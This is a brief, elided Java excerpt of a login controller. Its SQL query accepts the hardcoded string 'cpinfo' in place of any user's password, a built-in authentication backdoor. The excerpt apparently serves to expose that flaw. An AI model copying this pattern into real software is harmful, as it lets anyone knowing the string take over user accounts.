...
public class LoginController {
    ...
    public void checkUser(HttpServletRequest request, HttpServletResponse response) {
        ...
        try {
            ...
            Bas_user user = (Bas_user) db.findOne("select /*+ RESULT_CACHE */ t.name ,t.* from bas_user t where Lower(t.job_no) = ? and (password = ? or 'cpinfo'=?)", new Object[]{user_key.toLowerCase(), password, password}, Bas_user.class);
            pw = response.getWriter();
            if (user != null) {
